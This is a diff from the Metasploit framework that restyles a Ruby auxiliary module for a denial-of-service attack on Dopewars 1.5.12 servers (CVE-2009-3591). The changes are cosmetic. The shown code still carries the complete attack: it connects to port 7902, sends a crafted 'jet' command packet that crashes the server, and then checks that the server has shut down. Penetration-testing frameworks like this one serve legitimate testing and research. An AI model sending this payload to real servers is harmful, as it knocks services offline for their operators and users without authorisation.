@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,26 +7,25 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'			 => 'Dopewars Denial of Service',
-      'Description'	 => %q{
-          The jet command in Dopewars 1.5.12 is vulnerable to a segmentaion fault due to
-        a  lack of input validation.
-      },
-      'Author'		 => [ 'Doug Prostko <dougtko[at]gmail.com>' ],
-      'License'		 => MSF_LICENSE,
-      'References'	 =>
-        [
-          [ 'CVE', '2009-3591' ],
-          [ 'OSVDB', '58884' ],
-          [ 'BID', '36606' ]
-        ],
-      'DisclosureDate' => "Oct 05 2009" ))
+                      'Name'			 => 'Dopewars Denial of Service',
+                      'Description'	 => %q(
+                          The jet command in Dopewars 1.5.12 is vulnerable to a segmentaion fault due to
+                        a  lack of input validation.
+                      ),
+                      'Author'		 => [ 'Doug Prostko <dougtko[at]gmail.com>' ],
+                      'License'		 => MSF_LICENSE,
+                      'References'	 =>
+                        [
+                          [ 'CVE', '2009-3591' ],
+                          [ 'OSVDB', '58884' ],
+                          [ 'BID', '36606' ]
+                        ],
+                      'DisclosureDate' => "Oct 05 2009"))
 
     register_options([Opt::RPORT(7902)], self.class)
   end
@@ -39,7 +39,7 @@ class MetasploitModule < Msf::Auxiliary
     # 525			dopelog(4, LF_SERVER, "%s jets to %s",
     #
     connect
-    pkt =  "foo^^Ar1111111\n^^Acfoo\n^AV65536\n"
+    pkt = "foo^^Ar1111111\n^^Acfoo\n^AV65536\n"
     print_status("Sending dos packet...")
     sock.put(pkt)
     disconnect
@@ -49,7 +49,7 @@ class MetasploitModule < Msf::Auxiliary
     begin
       connect
     rescue ::Interrupt
-      raise $!
+      raise $ERROR_INFO
     rescue ::Rex::ConnectionRefused
       print_good("Dopewars server successfully shut down!")
     else
